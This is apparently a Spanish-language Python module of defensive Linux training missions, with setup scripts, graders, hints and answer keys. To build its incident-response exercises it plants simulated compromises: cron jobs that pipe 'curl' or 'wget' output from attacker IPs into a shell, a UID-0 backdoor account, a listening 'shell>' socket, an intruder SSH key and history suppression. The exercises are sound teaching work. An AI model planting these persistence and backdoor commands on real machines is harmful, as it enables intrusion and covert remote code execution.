"""Misiones en la máquina Ubuntu REAL. Cada una tiene un `setup` (lo corre NetLab como root antes de empezar) y un
`check` (sale con 0 si lo lograste; lo que imprima se le muestra al alumno). Los {{VARIABLES}} cambian en cada partida,
así no te aprendes la respuesta de memoria."""
from __future__ import annotations

import random

NOMBRES = ["backup", "deploy", "svc_web", "jenkins", "oracle", "mysql_adm", "soporte", "invitado", "devops", "temp01"]
MALOS = ["sysupdate", "kworkerds", "dbus-helper", "netcheck", "snapd-sync", "cronhelper", "systemd-netlog"]


def _ip(r: random.Random) -> str:
    return r.choice(["185.220.101.", "45.155.205.", "103.75.190.", "91.240.118.", "194.26.29."]) + str(r.randint(2, 250))


def _vars(r: random.Random) -> dict:
    return {
        "IP": _ip(r), "IP2": _ip(r), "USR": r.choice(NOMBRES) + str(r.randint(1, 99)), "MAL": r.choice(MALOS),
        "PUERTO": str(r.choice([4444, 1337, 31337, 6667, 8081, 9001, 5555])), "TOKEN": "NETLAB{" + "".join(r.choice("abcdef0123456789") for _ in range(12)) + "}",
        "DIR": r.choice(["/var/tmp/.cache", "/opt/.x", "/usr/share/.fonts-old", "/home/alumno/.local/share/.t"]),
        "N": str(r.randint(4, 9)),
    }


def M(id, nivel, titulo, historia, objetivo, setup, check, pistas, solucion):
    return {"id": id, "nivel": nivel, "titulo": titulo, "historia": historia, "objetivo": objetivo, "setup": setup.strip(),
            "check": check.strip(), "pistas": pistas, "solucion": solucion}


MISIONES = [
    # ------------------------------------------------------------------ Básico
    M("r1", "Básico", "La bandera escondida",
      "Un compañero dejó una bandera en algún lugar de tu home, dentro de un archivo oculto.",
      "Encuentra el archivo y guarda su contenido (la bandera) en ~/respuesta.txt",
      """
d=/home/alumno/lab/$(shuf -n1 -e logs docs tmp proyectos)/$(shuf -n1 -e a b c)
mkdir -p "$d"; echo '{{TOKEN}}' > "$d/.bandera"; for i in 1 2 3; do echo "nada aquí $RANDOM" > "$d/../nota$i.txt"; done
chown -R alumno:alumno /home/alumno/lab; rm -f /home/alumno/respuesta.txt""",
      """grep -qF '{{TOKEN}}' /home/alumno/respuesta.txt 2>/dev/null && echo "¡Bandera correcta!" || { echo "~/respuesta.txt no tiene la bandera correcta."; exit 1; }""",
      ["Los archivos ocultos empiezan con punto: usa `ls -la` o `find`.", "`find ~/lab -name '.*' -type f` y luego `cat archivo > ~/respuesta.txt`."],
      "find ~/lab -name '.bandera' -exec cat {} \\; > ~/respuesta.txt"),
    M("r2", "Básico", "La llave privada expuesta",
      "Alguien copió una llave SSH privada con permisos que deja leerla a cualquiera. ssh la va a rechazar y además es un riesgo.",
      "Deja ~/.ssh/id_lab con permisos 600 y que sea de alumno",
      """mkdir -p /home/alumno/.ssh; ssh-keygen -q -t ed25519 -N '' -f /home/alumno/.ssh/id_lab <<<y >/dev/null 2>&1
chmod 644 /home/alumno/.ssh/id_lab; chown root:root /home/alumno/.ssh/id_lab""",
      """p=$(stat -c %a /home/alumno/.ssh/id_lab); o=$(stat -c %U /home/alumno/.ssh/id_lab)
[ "$p" = 600 ] && [ "$o" = alumno ] && echo "Permisos $p y dueño $o: perfecto." || { echo "Ahora tiene permisos $p y dueño $o."; exit 1; }""",
      ["`ls -l ~/.ssh` te muestra permisos y dueño.", "`sudo chown alumno:alumno ~/.ssh/id_lab` y `chmod 600 ~/.ssh/id_lab`."],
      "sudo chown alumno:alumno ~/.ssh/id_lab && chmod 600 ~/.ssh/id_lab"),
    M("r3", "Básico", "Alta de un analista",
      "Entró un nuevo analista al SOC.",
      "Crea el usuario {{USR}} con home, shell /bin/bash y en el grupo analistas (créalo si no existe)",
      """userdel -r {{USR}} 2>/dev/null; groupdel analistas 2>/dev/null; true""",
      """id {{USR}} >/dev/null 2>&1 || { echo "No existe el usuario {{USR}}."; exit 1; }
[ -d /home/{{USR}} ] || { echo "Falta su carpeta /home/{{USR}}."; exit 1; }
[ "$(getent passwd {{USR}} | cut -d: -f7)" = /bin/bash ] || { echo "Su shell no es /bin/bash."; exit 1; }
id -nG {{USR}} | grep -qw analistas || { echo "No está en el grupo analistas."; exit 1; }
echo "Usuario {{USR}} listo."
""",
      ["Primero `sudo groupadd analistas`.", "`sudo useradd -m -s /bin/bash -G analistas {{USR}}`."],
      "sudo groupadd analistas; sudo useradd -m -s /bin/bash -G analistas {{USR}}"),
    M("r4", "Básico", "Levanta el servicio",
      "El servicio netlab-web (un servidor web de prueba en el puerto 8080) está detenido y no arranca solo.",
      "Haz que netlab-web esté corriendo y que arranque al encender la máquina",
      """cat > /etc/systemd/system/netlab-web.service <<'EOF'
[Unit]
Description=Servidor web de practica NetLab
[Service]
WorkingDirectory=/tmp
ExecStart=/usr/bin/python3 -m http.server 8080
Restart=on-failure
[Install]
WantedBy=multi-user.target
EOF
systemctl daemon-reload; systemctl disable --now netlab-web 2>/dev/null; true""",
      """systemctl is-active -q netlab-web || { echo "netlab-web no está corriendo."; exit 1; }
systemctl is-enabled -q netlab-web || { echo "Corre, pero no arrancará solo al reiniciar (falta enable)."; exit 1; }
curl -s -o /dev/null http://127.0.0.1:8080 && echo "Responde en el 8080. ¡Listo!" || { echo "El servicio no responde en el 8080."; exit 1; }""",
      ["`systemctl status netlab-web` te dice cómo está.", "`sudo systemctl enable --now netlab-web`."],
      "sudo systemctl enable --now netlab-web"),
    # ------------------------------------------------------------------ Intermedio
    M("r5", "Intermedio", "Fuerza bruta SSH",
      "El SIEM avisa de muchos intentos fallidos de SSH. Los logs de la alerta están en /var/log/netlab/auth.log.",
      "Encuentra la IP con más intentos fallidos y bloquéala con ufw (sin cerrarte el SSH)",
      """mkdir -p /var/log/netlab; f=/var/log/netlab/auth.log; : > $f
for i in $(seq 1 {{N}}); do echo "Nov 14 03:1$i:0$i netlab sshd[10$i]: Failed password for invalid user admin from {{IP2}} port 4$i ssh2" >> $f; done
for i in $(seq 1 40); do echo "Nov 14 03:2$((i%10)):$((i%60)) netlab sshd[20$i]: Failed password for root from {{IP}} port 5$i ssh2" >> $f; done
echo "Nov 14 04:00:00 netlab sshd[300]: Accepted publickey for alumno from 10.0.2.2 port 50000 ssh2" >> $f
ufw --force reset >/dev/null; ufw allow OpenSSH >/dev/null; ufw --force enable >/dev/null""",
      """ufw status | grep -E "DENY|REJECT" | grep -qF '{{IP}}' || { echo "No veo ninguna regla que bloquee a la IP atacante."; exit 1; }
ufw status | grep -q "Status: active" || { echo "ufw no está activo."; exit 1; }
echo "Bloqueaste a {{IP}} (el que más intentó). ¡Bien!\"""",
      ["Cuenta las IPs: `grep Failed /var/log/netlab/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn`.",
       "`sudo ufw deny from IP` (o `sudo ufw insert 1 deny from IP` para que vaya primero)."],
      "sudo ufw insert 1 deny from {{IP}}"),
    M("r6", "Intermedio", "Puerto sospechoso",
      "Un escaneo interno encontró un puerto raro escuchando en este servidor.",
      "Encuentra qué servicio abrió el puerto, detenlo, deshabilítalo y borra su programa",
      """mkdir -p /usr/local/lib/.{{MAL}}
cat > /usr/local/bin/{{MAL}} <<'EOF'
#!/usr/bin/python3
import socket
s=socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1); s.bind(("0.0.0.0",{{PUERTO}})); s.listen(5)
while True:
    c,_=s.accept(); c.send(b"shell> "); c.close()
EOF
chmod +x /usr/local/bin/{{MAL}}
cat > /etc/systemd/system/{{MAL}}.service <<'EOF'
[Unit]
Description=System update helper
[Service]
ExecStart=/usr/local/bin/{{MAL}}
Restart=always
[Install]
WantedBy=multi-user.target
EOF
systemctl daemon-reload; systemctl enable --now {{MAL}} >/dev/null 2>&1""",
      """ss -ltn | grep -q ':{{PUERTO}} ' && { echo "El puerto {{PUERTO}} sigue abierto."; exit 1; }
systemctl is-enabled -q {{MAL}} 2>/dev/null && { echo "El servicio sigue habilitado: volverá al reiniciar."; exit 1; }
[ -e /usr/local/bin/{{MAL}} ] && { echo "El programa /usr/local/bin/{{MAL}} sigue ahí."; exit 1; }
echo "Backdoor eliminada: puerto {{PUERTO}} cerrado, servicio {{MAL}} fuera.\"""",
      ["`sudo ss -ltnp` muestra puertos y el proceso que los abrió.", "`systemctl status <pid>` te dice el servicio; luego `disable --now` y `rm` del ExecStart."],
      "sudo systemctl disable --now {{MAL}}; sudo rm /usr/local/bin/{{MAL}} /etc/systemd/system/{{MAL}}.service"),
    M("r7", "Intermedio", "Persistencia en cron",
      "El EDR vio conexiones cada minuto hacia una IP extraña. Algo se programó para ejecutarse solo.",
      "Encuentra y elimina la tarea programada maliciosa (sin borrar las legítimas)",
      """echo "* * * * * root curl -s http://{{IP}}/b.sh | bash >/dev/null 2>&1" > /etc/cron.d/{{MAL}}
echo "17 3 * * * root /usr/bin/true # mantenimiento legítimo" > /etc/cron.d/netlab-mantenimiento
(crontab -u alumno -l 2>/dev/null | grep -v '{{IP}}'; echo "*/5 * * * * wget -qO- http://{{IP}}:8080/k | sh") | crontab -u alumno -""",
      """grep -rqF '{{IP}}' /etc/cron.d /etc/crontab /var/spool/cron 2>/dev/null && { echo "Todavía hay una tarea que llama a {{IP}}."; exit 1; }
[ -f /etc/cron.d/netlab-mantenimiento ] || { echo "Borraste también la tarea legítima de mantenimiento."; exit 1; }
echo "Persistencia eliminada (había DOS: la del sistema y la del usuario).\"""",
      ["Revisa `/etc/cron.d/`, `/etc/crontab` y el crontab de cada usuario (`sudo crontab -l -u alumno`).", "Ojo: hay más de una."],
      "sudo rm /etc/cron.d/{{MAL}}; crontab -l | grep -v {{IP}} | crontab -"),
    M("r8", "Intermedio", "Otro root",
      "Una auditoría dice que hay una cuenta con privilegios de root que nadie autorizó.",
      "Encuentra la cuenta con UID 0 que no es root y elimínala",
      """userdel -f {{USR}} 2>/dev/null; useradd -o -u 0 -g 0 -M -s /bin/bash {{USR}}; echo '{{USR}}:Passw0rd!' | chpasswd""",
      """n=$(awk -F: '$3==0 && $1!="root"' /etc/passwd | wc -l)
[ "$n" -eq 0 ] && echo "Solo root tiene UID 0. ¡Bien!" || { echo "Sigue habiendo $n cuenta(s) con UID 0 además de root."; exit 1; }""",
      ["`awk -F: '$3==0' /etc/passwd`", "`sudo userdel -f NOMBRE` (con -f porque comparte UID con root)."],
      "sudo userdel -f {{USR}}"),
    M("r9", "Intermedio", "Llave SSH intrusa",
      "Alguien agregó su llave a tu cuenta para entrar sin contraseña.",
      "Quita SOLO la llave del intruso de ~/.ssh/authorized_keys (si quitas la de NetLab, te quedas fuera)",
      """k=$(ssh-keygen -q -t ed25519 -N '' -C 'kali@{{MAL}}' -f /tmp/intrusa <<<y >/dev/null 2>&1; cat /tmp/intrusa.pub); rm -f /tmp/intrusa*
grep -v 'kali@' /home/alumno/.ssh/authorized_keys > /tmp/ak; echo "$k" >> /tmp/ak; cat /tmp/ak > /home/alumno/.ssh/authorized_keys; rm /tmp/ak""",
      """grep -q 'kali@' /home/alumno/.ssh/authorized_keys && { echo "La llave del intruso (kali@…) sigue ahí."; exit 1; }
grep -q 'netlab' /home/alumno/.ssh/authorized_keys && echo "Intruso fuera y tu acceso intacto." || { echo "Borraste la llave de NetLab."; exit 1; }""",
      ["`cat ~/.ssh/authorized_keys`: cada línea es una llave; el final es su comentario.", "`sed -i '/kali@/d' ~/.ssh/authorized_keys`."],
      "sed -i '/kali@/d' ~/.ssh/authorized_keys"),
    M("r10", "Intermedio", "El minero",
      "El servidor va lento y un proceso raro se come el CPU. Huele a criptominero.",
      "Mata el proceso que se come el CPU, borra su binario y lo que lo vuelve a levantar",
      """mkdir -p {{DIR}}; printf '#!/usr/bin/python3\nimport time\nwhile True:\n    t=time.time()\n    while time.time()-t<0.35: pass\n    time.sleep(0.65)\n' > {{DIR}}/{{MAL}}; chmod +x {{DIR}}/{{MAL}}
cat > /etc/systemd/system/{{MAL}}.service <<EOF
[Unit]
Description=Kernel worker
[Service]
ExecStart={{DIR}}/{{MAL}}
StandardOutput=null
Nice=19
Restart=always
[Install]
WantedBy=multi-user.target
EOF
systemctl daemon-reload; systemctl enable --now {{MAL}} >/dev/null 2>&1""",
      """sleep 3; pgrep -f '{{DIR}}/{{MAL}}' >/dev/null && { echo "El minero sigue corriendo (¿lo mataste pero algo lo revivió?)."; exit 1; }
[ -e '{{DIR}}/{{MAL}}' ] && { echo "Su binario sigue en {{DIR}}."; exit 1; }
systemctl is-enabled -q {{MAL}} 2>/dev/null && { echo "El servicio que lo revive sigue habilitado."; exit 1; }
echo "Minero eliminado y sin forma de volver.\"""",
      ["`top` o `ps aux --sort=-%cpu | head`.", "Si lo matas y revive, algo lo reinicia: `systemctl status PID`."],
      "sudo systemctl disable --now {{MAL}}; sudo rm -rf {{DIR}} /etc/systemd/system/{{MAL}}.service"),
    # ------------------------------------------------------------------ Avanzado
    M("r11", "Avanzado", "Respaldo automático",
      "El auditor exige respaldo diario de /etc.",
      "Crea /usr/local/bin/respaldo.sh que guarde /etc en /backup/etc-FECHA.tar.gz y prográmalo para root a las 02:00 diario",
      """rm -rf /backup /usr/local/bin/respaldo.sh; crontab -u root -l 2>/dev/null | grep -v respaldo | crontab -u root - 2>/dev/null; true""",
      """[ -x /usr/local/bin/respaldo.sh ] || { echo "/usr/local/bin/respaldo.sh no existe o no es ejecutable."; exit 1; }
rm -rf /backup/*; /usr/local/bin/respaldo.sh >/dev/null 2>&1
ls /backup/etc-*.tar.gz >/dev/null 2>&1 || { echo "Al correrlo no aparece /backup/etc-FECHA.tar.gz."; exit 1; }
tar -tzf /backup/etc-*.tar.gz | grep -q 'etc/passwd' || { echo "El .tar.gz no trae /etc/passwd."; exit 1; }
crontab -u root -l 2>/dev/null | grep -E '^0+ +0?2 +\\* +\\* +\\*' | grep -q respaldo.sh || { echo "No está programado en el crontab de root a las 02:00."; exit 1; }
echo "Respaldo probado y programado.\"""",
      ["El script: `tar -czf /backup/etc-$(date +%F).tar.gz /etc` (y `mkdir -p /backup`).", "`sudo crontab -e` y la línea `0 2 * * * /usr/local/bin/respaldo.sh`."],
      "printf '#!/bin/bash\\nmkdir -p /backup\\ntar -czf /backup/etc-$(date +%%F).tar.gz /etc\\n' | sudo tee /usr/local/bin/respaldo.sh; sudo chmod +x /usr/local/bin/respaldo.sh; (sudo crontab -l; echo '0 2 * * * /usr/local/bin/respaldo.sh') | sudo crontab -"),
    M("r12", "Avanzado", "El servicio que truena",
      "netlab-api se cae al arrancar. Los desarrolladores juran que el error 'no sale en ningún lado'.",
      "Encuentra el código de error que imprime al fallar (en el journal) y guárdalo en ~/respuesta.txt",
      """cat > /etc/systemd/system/netlab-api.service <<'EOF'
[Unit]
Description=API de NetLab
[Service]
ExecStart=/bin/bash -c 'echo "conectando a la base de datos..."; sleep 1; echo "FATAL: credenciales invalidas, codigo {{TOKEN}}" >&2; sleep 2; exit 3'
SyslogIdentifier=netlab-api
[Install]
WantedBy=multi-user.target
EOF
systemctl daemon-reload; systemctl restart netlab-api 2>/dev/null; sleep 4; rm -f /home/alumno/respuesta.txt; true""",
      """grep -qF '{{TOKEN}}' /home/alumno/respuesta.txt 2>/dev/null && echo "Ese es el error. ¡Bien encontrado!" || { echo "~/respuesta.txt no tiene el código de error."; exit 1; }""",
      ["`systemctl status netlab-api` muestra las últimas líneas.", "`journalctl -u netlab-api --no-pager`."],
      "journalctl -u netlab-api | grep -o 'NETLAB{[^}]*}' | tail -1 > ~/respuesta.txt"),
    M("r13", "Avanzado", "Hardening de SSH",
      "Política nueva: nadie entra como root por SSH y solo se permite entrar con llave.",
      "Desactiva el login de root y la autenticación por contraseña en SSH, y recarga el servicio",
      """rm -f /etc/ssh/sshd_config.d/99-netlab*.conf; echo -e "PermitRootLogin yes\\nPasswordAuthentication yes" > /etc/ssh/sshd_config.d/10-inseguro.conf
systemctl reload ssh 2>/dev/null || systemctl reload sshd; true""",
      """c=$(sshd -T 2>/dev/null)
echo "$c" | grep -qi '^permitrootlogin no' || { echo "Root todavía puede entrar (PermitRootLogin)."; exit 1; }
echo "$c" | grep -qi '^passwordauthentication no' || { echo "Todavía se permite entrar con contraseña."; exit 1; }
echo "SSH endurecido. Ojo: sshd usa la PRIMERA vez que aparece cada opción.\"""",
      ["Revisa `/etc/ssh/sshd_config` y TODO `/etc/ssh/sshd_config.d/`.", "`sudo sshd -T | grep -i -e permitroot -e passwordauth` te dice lo que de verdad aplica."],
      "sudo rm /etc/ssh/sshd_config.d/10-inseguro.conf; echo -e 'PermitRootLogin no\\nPasswordAuthentication no' | sudo tee /etc/ssh/sshd_config.d/01-netlab.conf; sudo systemctl reload ssh"),
    M("r14", "Avanzado", "Firewall de un servidor web",
      "Este servidor solo debe exponer SSH y web.",
      "Con ufw: denegar todo lo entrante por defecto, permitir solo 22 y 80/tcp, y activarlo",
      """ufw --force reset >/dev/null; ufw default allow incoming >/dev/null; ufw allow 3306 >/dev/null; ufw allow 23 >/dev/null; ufw allow OpenSSH >/dev/null; ufw --force enable >/dev/null""",
      """s=$(ufw status verbose)
echo "$s" | grep -q "Status: active" || { echo "ufw no está activo."; exit 1; }
echo "$s" | grep -q "deny (incoming)" || { echo "La política por defecto de entrada no es deny."; exit 1; }
echo "$s" | grep -Eq "^(22|OpenSSH)" || { echo "Falta permitir SSH."; exit 1; }
echo "$s" | grep -Eq "^80(/tcp)? " || { echo "Falta permitir 80/tcp."; exit 1; }
echo "$s" | grep -Eq "^(3306|23)[ /]" && { echo "Siguen abiertos puertos que no deben (23 o 3306)."; exit 1; }
echo "Firewall correcto.\"""",
      ["`sudo ufw status numbered` y `sudo ufw delete N`.", "`sudo ufw default deny incoming`, `sudo ufw allow 80/tcp`."],
      "sudo ufw delete allow 3306; sudo ufw delete allow 23; sudo ufw default deny incoming; sudo ufw allow 80/tcp"),
    # ------------------------------------------------------------------ Experto
    M("r15", "Experto", "Incidente completo",
      "Madrugada del sábado. El servidor fue comprometido: el atacante dejó una cuenta root, una backdoor escuchando y persistencia en cron.",
      "Limpia las TRES cosas y escribe en ~/reporte.txt la IP del atacante (está en la persistencia)",
      """userdel -f {{USR}} 2>/dev/null; useradd -o -u 0 -g 0 -M -s /bin/bash {{USR}}
cat > /usr/local/bin/{{MAL}} <<'EOF'
#!/usr/bin/python3
import socket
s=socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1); s.bind(("0.0.0.0",{{PUERTO}})); s.listen(5)
while True:
    c,_=s.accept(); c.close()
EOF
chmod +x /usr/local/bin/{{MAL}}
printf '[Unit]\\nDescription=helper\\n[Service]\\nExecStart=/usr/local/bin/{{MAL}}\\nRestart=always\\n[Install]\\nWantedBy=multi-user.target\\n' > /etc/systemd/system/{{MAL}}.service
systemctl daemon-reload; systemctl enable --now {{MAL}} >/dev/null 2>&1
echo "*/2 * * * * root curl -s http://{{IP}}/x | bash" > /etc/cron.d/.{{MAL}}
rm -f /home/alumno/reporte.txt""",
      """f=0
[ "$(awk -F: '$3==0 && $1!="root"' /etc/passwd | wc -l)" -eq 0 ] || { echo "✗ Sigue la cuenta con UID 0."; f=1; }
ss -ltn | grep -q ':{{PUERTO}} ' && { echo "✗ La backdoor sigue escuchando en {{PUERTO}}."; f=1; }
systemctl is-enabled -q {{MAL}} 2>/dev/null && { echo "✗ El servicio de la backdoor sigue habilitado."; f=1; }
grep -rqF '{{IP}}' /etc/cron.d /etc/crontab /var/spool/cron 2>/dev/null && { echo "✗ Sigue la persistencia en cron."; f=1; }
grep -qF '{{IP}}' /home/alumno/reporte.txt 2>/dev/null || { echo "✗ ~/reporte.txt no tiene la IP del atacante."; f=1; }
[ $f -eq 0 ] && echo "Incidente contenido y reportado. Nivel SOC." ; exit $f""",
      ["Tres frentes: `/etc/passwd` (UID 0), `ss -ltnp` (puertos) y `ls -la /etc/cron.d` (ojo con archivos ocultos).",
       "La IP aparece dentro del archivo de cron."],
      "sudo userdel -f {{USR}}; sudo systemctl disable --now {{MAL}}; sudo rm /usr/local/bin/{{MAL}}; sudo rm /etc/cron.d/.{{MAL}}; echo {{IP}} > ~/reporte.txt"),
    M("r16", "Experto", "¿Qué cambió?",
      "Integridad de archivos: alguien modificó un archivo de configuración en /etc hace unos minutos.",
      "Encuentra el archivo de /etc modificado más recientemente por el atacante y escribe su ruta completa en ~/respuesta.txt",
      """f=/etc/$(shuf -n1 -e hosts.allow environment issue.net motd.d/00-netlab profile.d/{{MAL}}.sh)
mkdir -p "$(dirname $f)"; echo "export HISTFILE=/dev/null # {{IP}}" >> "$f"; echo "$f" > /opt/netlab/r16
rm -f /home/alumno/respuesta.txt""",
      """[ "$(tr -d ' \\n' < /home/alumno/respuesta.txt 2>/dev/null)" = "$(cat /opt/netlab/r16)" ] && echo "Ese es. Además desactivaba el historial: clásico." || { echo "No es ese archivo."; exit 1; }""",
      ["`find /etc -type f -mmin -30` (modificados en los últimos 30 min).", "`ls -lt` ordena por fecha; revisa el contenido sospechoso."],
      "sudo find /etc -type f -mmin -30 -printf '%T@ %p\\n' | sort -n | tail -1 | cut -d' ' -f2 > ~/respuesta.txt"),
]


def preparar(mid: str, semilla: int | None = None) -> dict:
    m = next((x for x in MISIONES if x["id"] == mid), None)
    if not m:
        raise KeyError(mid)
    v = _vars(random.Random(semilla))

    def sub(t: str) -> str:
        for k, val in v.items():
            t = t.replace("{{" + k + "}}", val)
        return t

    return {**m, "objetivo": sub(m["objetivo"]), "setup": sub(m["setup"]), "check": sub(m["check"]),
            "pistas": [sub(p) for p in m["pistas"]], "solucion": sub(m["solucion"]), "vars": v}
